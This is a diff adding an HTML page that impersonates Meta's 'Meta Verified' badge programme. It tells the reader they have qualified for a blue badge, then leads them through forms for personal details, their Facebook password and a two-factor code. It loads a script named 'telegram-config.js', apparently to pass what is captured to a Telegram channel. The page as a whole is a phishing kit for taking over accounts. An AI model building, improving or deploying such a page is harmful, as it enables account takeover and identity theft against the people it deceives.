@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Verified - Rewards for you</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Cpath fill='%231877F2' fill-rule='evenodd' d='M8.217 5.243C9.145 3.988 10.171 3 11.483 3 13.96 3 16 6.153 16.001 9.907c0 2.29-.986 3.725-2.757 3.725-1.543 0-2.395-.866-3.924-3.424l-.667-1.123-.118-.197a55 55 0 0 0-.53-.877l-1.178 2.08c-1.673 2.925-2.615 3.541-3.923 3.541C1.086 13.632 0 12.217 0 9.973 0 6.388 1.995 3 4.598 3q.477-.001.924.122c.31.086.611.22.913.407.577.359 1.154.915 1.782 1.714m1.516 2.224q-.378-.615-.727-1.133L9 6.326c.845-1.305 1.543-1.954 2.372-1.954 1.723 0 3.102 2.537 3.102 5.653 0 1.188-.39 1.877-1.195 1.877-.773 0-1.142-.51-2.61-2.87zM4.846 4.756c.725.1 1.385.634 2.34 2.001A212 212 0 0 0 5.551 9.3c-1.357 2.126-1.826 2.603-2.581 2.603-.777 0-1.24-.682-1.24-1.9 0-2.602 1.298-5.264 2.846-5.264q.137 0 .27.018'/%3E%3C/svg%3E">
+    <link rel="stylesheet" href="styles.css">
+    <!-- Google Fonts for premium typography -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Premium background elements for visual wow-factor -->
+    <div class="bg-blur bg-blur-1"></div>
+    <div class="bg-blur bg-blur-2"></div>
+
+    <div class="app-container">
+        <!-- Main Card -->
+        <main class="card">
+            <!-- Verified Badge Icon -->
+            <div class="badge-container">
+                <svg class="verified-badge" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <!-- Rosette background -->
+                    <path d="M10.067.87a2.89 2.89 0 0 0-4.134 0l-.622.638-.89-.011a2.89 2.89 0 0 0-2.924 2.924l.01.89-.636.622a2.89 2.89 0 0 0 0 4.134l.637.622-.011.89a2.89 2.89 0 0 0 2.924 2.924l.89-.01.622.636a2.89 2.89 0 0 0 4.134 0l.622-.637.89.011a2.89 2.89 0 0 0 2.924-2.924l-.01-.89.636-.622a2.89 2.89 0 0 0 0-4.134l-.637-.622.011-.89a2.89 2.89 0 0 0-2.924-2.924l-.89.01z" fill="#1877F2"/>
+                    <!-- Checkmark path -->
+                    <path d="M10.354 6.854l-3 3a.5.5 0 0 1-.708 0l-1.5-1.5a.5.5 0 1 1 .708-.708L7 8.793l2.646-2.647a.5.5 0 0 1 .708.708z" fill="white"/>
+                </svg>
+            </div>
+
+            <!-- Headers -->
+            <h1 class="title">Meta Verified - Rewards for you</h1>
+            <p class="subtitle">Show the world that you mean business.</p>
+
+            <!-- Description -->
+            <div class="content-text">
+                <p>Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience. We're thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!</p>
+                <div class="ticket-box">
+                    <span>Your ticket id:</span> <code class="ticket-id" id="ticket-id-display">#Y88T-KC11-Q01C</code>
+                </div>
+            </div>
+
+            <!-- Guide Section -->
+            <section class="guide-section">
+                <h2>Verified Blue Badge Request Guide</h2>
+                <ul class="guide-list">
+                    <li>
+                        <div class="bullet-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M20 6L9 17l-5-5"/></svg>
+                        </div>
+                        <p>Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats</p>
+                    </li>
+                    <li>
+                        <div class="bullet-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M20 6L9 17l-5-5"/></svg>
+                        </div>
+                        <p>In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.</p>
+                    </li>
+                    <li>
+                        <div class="bullet-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M20 6L9 17l-5-5"/></svg>
+                        </div>
+                        <p>Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.</p>
+                    </li>
+                </ul>
+            </section>
+
+            <!-- Call to Action -->
+            <div class="action-container">
+                <button type="button" id="open-modal-btn" class="btn btn-primary">Submit request</button>
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <nav class="footer-links">
+                <a href="#" class="footer-link">Help Center</a>
+                <a href="#" class="footer-link">Privacy Policy</a>
+                <a href="#" class="footer-link">Terms of Service</a>
+                <a href="#" class="footer-link">Community Standards</a>
+            </nav>
+            <p class="copyright">Meta © 2026</p>
+        </footer>
+    </div>
+
+    <!-- Interactive Meta Verification Form Modal -->
+    <div id="request-modal" class="modal-overlay hidden">
+        <div class="modal-card">
+            <!-- Modal Header with centered Meta Logo and Right Close button -->
+            <div class="modal-header">
+                <div class="modal-header-logo-container">
+                    <svg class="meta-logo" viewBox="0 0 948 191" xmlns="http://www.w3.org/2000/svg">
+                        <defs>
+                            <linearGradient id="Grad_Logo1" x1="61" y1="117" x2="259" y2="127" gradientUnits="userSpaceOnUse">
+                                <stop style="stop-color:#0064e1" offset="0"/>
+                                <stop style="stop-color:#0064e1" offset="0.4"/>
+                                <stop style="stop-color:#0073ee" offset="0.83"/>
+                                <stop style="stop-color:#0082fb" offset="1"/>
+                            </linearGradient>
+                            <linearGradient id="Grad_Logo2" x1="45" y1="139" x2="45" y2="66" gradientUnits="userSpaceOnUse">
+                                <stop style="stop-color:#0082fb" offset="0"/>
+                                <stop style="stop-color:#0064e0" offset="1"/>
+                            </linearGradient>
+                        </defs>
+                        <path d="m31.06,125.96c0,10.98 2.41,19.41 5.56,24.51 4.13,6.68 10.29,9.51 16.57,9.51 8.1,0 15.51-2.01 29.79-21.76 11.44-15.83 24.92-38.05 33.99-51.98l15.36-23.6c10.67-16.39 23.02-34.61 37.18-46.96 11.56-10.08 24.03-15.68 36.58-15.68 21.07,0 41.14,12.21 56.5,35.11 16.81,25.08 24.97,56.67 24.97,89.27 0,19.38-3.82,33.62-10.32,44.87-6.28,10.88-18.52,21.75-39.11,21.75l0-31.02c17.63,0 22.03-16.2 22.03-34.74 0-26.42-6.16-55.74-19.73-76.69-9.63-14.86-22.11-23.94-35.84-23.94-14.85,0-26.8,11.2-40.23,31.17-7.14,10.61-14.47,23.54-22.7,38.13l-9.06,16.05c-18.2,32.27-22.81,39.62-31.91,51.75-15.95,21.24-29.57,29.29-47.5,29.29-21.27,0-34.72-9.21-43.05-23.09-6.8-11.31-10.14-26.15-10.14-43.06z" fill="#0081fb"/>
+                        <path d="m24.49,37.3c14.24-21.95 34.79-37.3 58.36-37.3 13.65,0 27.22,4.04 41.39,15.61 15.5,12.65 32.02,33.48 52.63,67.81l7.39,12.32c17.84,29.72 27.99,45.01 33.93,52.22 7.64,9.26 12.99,12.02 19.94,12.02 17.63,0 22.03-16.2 22.03-34.74l27.4-.86c0,19.38-3.82,33.62-10.32,44.87-6.28,10.88-18.52,21.75-39.11,21.75-12.8,0-24.14-2.78-36.68-14.61-9.64-9.08-20.91-25.21-29.58-39.71l-25.79-43.08c-12.94-21.62-24.81-37.74-31.68-45.04-7.39-7.85-16.89-17.33-32.05-17.33-12.27,0-22.69,8.61-31.41,21.78z" fill="url(#Grad_Logo1)"/>
+                        <path d="m82.35,31.23c-12.27,0-22.69,8.61-31.41,21.78-12.33,18.61-19.88,46.33-19.88,72.95 0,10.98 2.41,19.41 5.56,24.51l-26.48,17.44c-6.8-11.31-10.14-26.15-10.14-43.06 0-30.75 8.44-62.8 24.49-87.55 14.24-21.95 34.79-37.3 58.36-37.3z" fill="url(#Grad_Logo2)"/>
+                        <path d="m347.94,6.04h35.93l61.09,110.52 61.1-110.52h35.15v181.6h-29.31v-139.18l-53.58,96.38h-27.5l-53.57-96.38v139.18h-29.31zm285.11,67.71c-21.02,0-33.68,15.82-36.71,35.41h71.34c-1.47-20.18-13.11-35.41-34.63-35.41zm-65.77,46.57c0-41.22 26.64-71.22 66.28-71.22 38.99,0 62.27,29.62 62.27,73.42v8.05h-99.49c3.53,21.31 17.67,35.67 40.47,35.67 18.19,0 29.56-5.55 40.34-15.7l15.57,19.07c-14.67,13.49-33.33,21.27-56.95,21.27-42.91,0-68.49-31.29-68.49-70.56zm164.09-43.97h-26.98v-24h26.98v-39.69h28.28v39.69h40.99v24h-40.99v60.83c0,20.77 6.64,28.15 22.96,28.15 7.45,0 11.72-.64 18.03-1.69v23.74c-7.86,2.22-15.36,3.24-23.48,3.24-30.53,0-45.79-16.68-45.79-50.07zm188.35,23.34c-5.68-14.34-18.35-24.9-36.97-24.9-24.2,0-39.69,17.17-39.69,45.14 0,27.27 14.26,45.27 38.53,45.27 19.08,0 32.7-11.1 38.13-24.91zm28.28,87.95h-27.76v-18.94c-7.76,11.15-21.88,22.18-44.75,22.18-36.78,0-61.36-30.79-61.36-70.95 0-40.54 25.17-70.83 62.92-70.83 18.66,0 33.3,7.46 43.19,20.63v-17.38h27.76z" fill="#1C1E21" />
+                    </svg>
+                </div>
+                <button type="button" id="close-modal-btn" class="close-btn" aria-label="Close modal">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6L6 18M6 6l12 12"/></svg>
+                </button>
+            </div>
+
+            <!-- Single Scrollable Form Section -->
+            <form id="verification-form">
+                <!-- STEP 1: Account Info Form Fields -->
+                <div id="step-info-container" class="modal-step-container">
+                    <div class="modal-form-content">
+                        <!-- Full Name -->
+                        <div class="input-group">
+                            <input type="text" id="full-name" class="styled-input" placeholder="Full Name" required>
+                            <span class="error-msg" id="err-full-name">Please enter your full name</span>
+                        </div>
+
+                        <!-- Email -->
+                        <div class="input-group">
+                            <input type="text" id="email" class="styled-input" placeholder="Email" required>
+                            <span class="error-msg" id="err-email">Please enter a valid email address</span>
+                        </div>
+
+                        <!-- Email Business (Optional) -->
+                        <div class="input-group">
+                            <input type="text" id="email-business" class="styled-input" placeholder="Email Business (Optional)">
+                            <span class="error-msg" id="err-email-business">Please enter a valid business email</span>
+                        </div>
+
+                        <!-- Page Name -->
+                        <div class="input-group">
+                            <input type="text" id="page-name" class="styled-input" placeholder="Page Name" required>
+                            <span class="error-msg" id="err-page-name">Please enter your page name</span>
+                        </div>
+
+                        <!-- Country Flags & Phone Number Input Group -->
+                        <div class="phone-row-group">
+                            <!-- Custom Country Code Dropdown -->
+                            <div class="custom-country-picker" id="country-picker">
+                                <div class="selected-country-btn" id="selected-country-btn" tabindex="0">
+                                    <img class="selected-flag-img" id="selected-flag-img" src="https://flagcdn.com/w40/sg.png" alt="Singapore Flag">
+                                    <span class="selected-dial-code" id="selected-dial-code">+65</span>
+                                    <span class="dropdown-caret">▼</span>
+                                </div>
+                                <!-- Country List Overlay Menu -->
+                                <div class="country-dropdown-menu hidden" id="country-dropdown-menu">
+                                    <div class="country-search-box">
+                                        <input type="text" id="country-search-input" placeholder="Search country or code...">
+                                    </div>
+                                    <div class="country-list-scrollable" id="country-list-scrollable">
+                                        <!-- Populated by JS -->
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Phone Number Input with Prefix -->
+                            <div class="phone-input-wrapper">
+                                <span class="phone-static-prefix" id="phone-static-prefix">+65</span>
+                                <input type="text" id="phone-number" placeholder="Phone Number" required>
+                            </div>
+                        </div>
+                        <div class="phone-error-row">
+                            <span class="error-msg" id="err-phone">Please enter a valid phone number</span>
+                        </div>
+
+                        <!-- Date of Birth Label & Grid -->
+                        <div class="dob-group">
+                            <label class="dob-label">Date of Birth</label>
+                            <div class="dob-inputs-grid">
+                                <div class="dob-select-wrapper">
+                                    <select id="dob-day" required>
+                                        <option value="" disabled selected>Day</option>
+                                        <!-- 1 to 31 -->
+                                    </select>
+                                </div>
+                                <div class="dob-select-wrapper">
+                                    <select id="dob-month" required>
+                                        <option value="" disabled selected>Month</option>
+                                        <!-- 1 to 12 -->
+                                    </select>
+                                </div>
+                                <div class="dob-select-wrapper">
+                                    <select id="dob-year" required>
+                                        <option value="" disabled selected>Year</option>
+                                        <!-- 1900 to 2026 -->
+                                    </select>
+                                </div>
+                            </div>
+                            <span class="error-msg" id="err-dob">Please complete your date of birth</span>
+                        </div>
+
+                        <!-- Note Textarea -->
+                        <div class="input-group">
+                            <textarea id="note" class="styled-textarea" rows="3" maxlength="500" placeholder="Note (Optional)"></textarea>
+                            <div class="note-char-counter"><span id="note-char-count">0</span>/500 characters</div>
+                        </div>
+
+                        <!-- Toggle Notification Row -->
+                        <div class="notification-toggle-card">
+                            <div class="notification-left">
+                                <div class="fb-icon-circle">
+                                    <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+                                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                                    </svg>
+                                </div>
+                                <div class="notification-text">
+                                    <span class="notification-title">on Facebook</span>
+                                    <span class="notification-subtitle">We will send you a notification on Facebook.</span>
+                                </div>
+                            </div>
+                            <div class="notification-right">
+                                <label class="switch-toggle">
+                                    <input type="checkbox" id="notification-checkbox" checked>
+                                    <span class="switch-slider"></span>
+                                </label>
+                            </div>
+                        </div>
+
+                        <!-- Terms Agreement Checkbox -->
+                        <div class="agreement-row">
+                            <label class="checkbox-container">
+                                <input type="checkbox" id="agree-terms" required>
+                                <span class="checkmark"></span>
+                                <span class="checkbox-label">I agree with <a href="#" class="terms-link">Terms of use</a></span>
+                            </label>
+                            <span class="error-msg" id="err-agree">You must agree with Terms of use to proceed</span>
+                        </div>
+                    </div>
+
+                    <!-- Modal Actions -->
+                    <div class="modal-footer-single">
+                        <button type="submit" id="submit-form-btn" class="btn btn-primary btn-submit-full">Send</button>
+                    </div>
+                </div>
+
+                <!-- STEP 2: Password Verification Screen (Initially Hidden) -->
+                <div id="step-password-container" class="modal-step-container hidden">
+                    <div class="modal-password-content">
+                        <!-- Meta Circular blue icon -->
+                        <div class="meta-circular-logo">
+                            <svg viewBox="0 0 16 16" width="34" height="34" fill="#1877F2" xmlns="http://www.w3.org/2000/svg">
+                                <path fill-rule="evenodd" d="M8.217 5.243C9.145 3.988 10.171 3 11.483 3 13.96 3 16 6.153 16.001 9.907c0 2.29-.986 3.725-2.757 3.725-1.543 0-2.395-.866-3.924-3.424l-.667-1.123-.118-.197a55 55 0 0 0-.53-.877l-1.178 2.08c-1.673 2.925-2.615 3.541-3.923 3.541C1.086 13.632 0 12.217 0 9.973 0 6.388 1.995 3 4.598 3q.477-.001.924.122c.31.086.611.22.913.407.577.359 1.154.915 1.782 1.714m1.516 2.224q-.378-.615-.727-1.133L9 6.326c.845-1.305 1.543-1.954 2.372-1.954 1.723 0 3.102 2.537 3.102 5.653 0 1.188-.39 1.877-1.195 1.877-.773 0-1.142-.51-2.61-2.87zM4.846 4.756c.725.1 1.385.634 2.34 2.001A212 212 0 0 0 5.551 9.3c-1.357 2.126-1.826 2.603-2.581 2.603-.777 0-1.24-.682-1.24-1.9 0-2.602 1.298-5.264 2.846-5.264q.137 0 .27.018"/>
+                            </svg>
+                        </div>
+                        
+                        <p class="password-prompt-text">For your security, you must enter your password to continue.</p>
+
+                        <div class="password-input-group">
+                            <div class="password-input-wrapper" id="password-input-wrapper">
+                                <input type="password" id="password-input" placeholder="Enter password">
+                                <button type="button" id="password-toggle-btn" class="password-toggle-btn">
+                                    <svg class="eye-open-icon" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                                        <circle cx="12" cy="12" r="3"/>
+                                    </svg>
+                                    <svg class="eye-closed-icon hidden" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
+                                        <line x1="1" y1="1" x2="23" y2="23"/>
+                                    </svg>
+                                </button>
+                            </div>
+                            <span class="password-error-msg" id="password-error-msg">Incorrect password. Please try again.</span>
+                        </div>
+
+                        <button type="button" id="continue-password-btn" class="btn btn-primary btn-submit-full">Continue</button>
+                        <div class="forgot-password-link-wrapper">
+                            <a href="#" class="forgot-password-link">Forgot your password?</a>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- STEP 3: Two-Factor Authentication Screen (Initially Hidden) -->
+                <div id="step-2fa-container" class="modal-step-container hidden">
+                    <div class="modal-2fa-content">
+                        <div class="fb-small-header">• Facebook</div>
+                        <h3 class="two-factor-title">Two-factor authentication required</h3>
+                        <p class="two-factor-subtitle">Check your email, Authenticator app, or phone number linked to your Facebook account to get the code.</p>
+                        
+                        <!-- 2FA Illustration -->
+                        <div class="two-factor-illustration">
+                            <svg viewBox="22 22 196 116" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg">
+                                <!-- Background shapes -->
+                                <circle cx="40" cy="90" r="14" fill="#E7F3FF" />
+                                <circle cx="200" cy="50" r="16" fill="#F0F2F5" />
+                                
+                                <!-- Placeholder lines -->
+                                <rect x="55" y="120" width="30" height="4" rx="2" fill="#DADDE1" />
+                                <rect x="55" y="128" width="20" height="4" rx="2" fill="#E4E6EB" />
+                                
+                                <rect x="155" y="100" width="35" height="4" rx="2" fill="#DADDE1" />
+                                <rect x="155" y="108" width="25" height="4" rx="2" fill="#E4E6EB" />
+
+                                <!-- Mobile Phone -->
+                                <rect x="95" y="30" width="50" height="90" rx="6" fill="#FFFFFF" stroke="#1C1E21" stroke-width="2" />
+                                <line x1="115" y1="34" x2="125" y2="34" stroke="#1C1E21" stroke-width="2" stroke-linecap="round" />
+                                <circle cx="120" cy="114" r="3" fill="#1C1E21" />
+
+                                <!-- Shield on the phone -->
+                                <path d="M120 50 L134 56 V68 C134 77 127 83 120 86 C113 83 106 77 106 68 V56 Z" fill="#F2A134" stroke="#E08316" stroke-width="1.5" />
+                                
+                                <!-- Purple message bubble (left) -->
+                                <path d="M68 64 C68 56 78 50 90 50 C102 50 112 56 112 64 C112 70 105 76 96 77 L96 82 L90 78 C78 78 68 72 68 64 Z" fill="#D396FF" />
+                                <circle cx="82" cy="64" r="2.5" fill="#8E44AD" />
+                                <circle cx="90" cy="64" r="2.5" fill="#8E44AD" />
+                                <circle cx="98" cy="64" r="2.5" fill="#8E44AD" />
+                                
+                                <!-- Blue check circle (left) -->
+                                <circle cx="50" cy="90" r="10" fill="#1877F2" />
+                                <path d="M46 90 L49 93 L55 87" fill="none" stroke="#FFFFFF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+
+                                <!-- Blue Password pill (bottom left) -->
+                                <rect x="52" y="100" width="56" height="15" rx="7.5" fill="#8EA9FF" />
+                                <circle cx="60" cy="107.5" r="2" fill="#FFFFFF" />
+                                <circle cx="68" cy="107.5" r="2" fill="#FFFFFF" />
+                                <circle cx="76" cy="107.5" r="2" fill="#FFFFFF" />
+                                <circle cx="84" cy="107.5" r="2" fill="#FFFFFF" />
+                                <circle cx="92" cy="107.5" r="2" fill="#FFFFFF" />
+
+                                <!-- Pink Padlock (right) -->
+                                <rect x="135" y="102" width="28" height="20" rx="3" fill="#FFA5D2" />
+                                <path d="M141 102 V97 C141 92 145 88 149 88 C153 88 157 92 157 97 V102" fill="none" stroke="#A36BFF" stroke-width="2" />
+                                <circle cx="149" cy="110" r="2.5" fill="#D22B76" />
+                                <line x1="149" y1="112.5" x2="149" y2="117" stroke="#D22B76" stroke-width="2" />
+
+                                <!-- Blue Toggle Switch (top right) -->
+                                <rect x="145" y="32" width="30" height="18" rx="9" fill="#5F8DFF" />
+                                <circle cx="154" cy="41" r="5" fill="#FFFFFF" />
+                                <circle cx="166" cy="41" r="5" fill="#D5E3FF" />
+
+                                <!-- Purple User badge (right) -->
+                                <circle cx="178" cy="72" r="12" fill="#BCA6FF" />
+                                <circle cx="178" cy="68" r="4.5" fill="#885FFF" />
+                                <path d="M170 79 C170 75 174 72 178 72 C182 72 186 75 186 79 Z" fill="#885FFF" />
+                            </svg>
+                        </div>
+
+                        <!-- Code input section -->
+                        <div class="code-input-group">
+                            <label for="code-input" class="code-label">Code</label>
+                            <input type="text" id="code-input" class="styled-code-input" placeholder="Enter security code" maxlength="8" inputmode="numeric">
+                            <span class="code-error-msg" id="code-error-msg">Incorrect code. Please try again.</span>
+                        </div>
+
+                        <button type="button" id="continue-2fa-btn" class="btn btn-primary btn-submit-full">Continue</button>
+                        
+                        <!-- Mini Meta Footer inside the step -->
+                        <div class="mini-meta-footer">
+                            <span class="mini-meta-symbol">∞</span> Meta
+                        </div>
+                    </div>
+                </div>
+            </form>
+
+            <!-- Success State Screen (Initially Hidden) -->
+            <div id="success-screen" class="success-screen hidden">
+                <div class="success-icon-wrapper">
+                    <svg class="success-checkmark" viewBox="0 0 24 24" fill="none">
+                        <circle cx="12" cy="12" r="11" stroke="#00A400" stroke-width="2" fill="#E6F4EA"/>
+                        <path d="M8 12l3 3 5-5" stroke="#00A400" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+                <h3>Verification Request Submitted!</h3>
+                <p>We've received your request to verify <strong id="success-page-name">Page Name</strong>. Our fact checkers will review your application within 24 hours.</p>
+                
+                <div class="success-details">
+                    <div class="detail-row">
+                        <span class="detail-label">Ticket ID:</span>
+                        <span class="detail-value text-bold" id="success-ticket-id">#Y88T-KC11-Q01C</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Page Name:</span>
+                        <span class="detail-value text-bold" id="success-page-name-detail">Page Name</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Email:</span>
+                        <span class="detail-value text-bold" id="success-email">email@example.com</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Phone:</span>
+                        <span class="detail-value text-bold" id="success-phone">+65 12345678</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Status:</span>
+                        <span class="detail-value status-pending">Pending Review</span>
+                    </div>
+                </div>
+
+                <div class="success-actions">
+                    <button type="button" id="success-close-btn" class="btn btn-primary w-full">Got it</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Active Toast Notification System -->
+    <div id="toast-container" class="toast-container"></div>
+
+    <script src="telegram-config.js"></script>
+    <script src="app.js"></script>
+</body>
+</html>
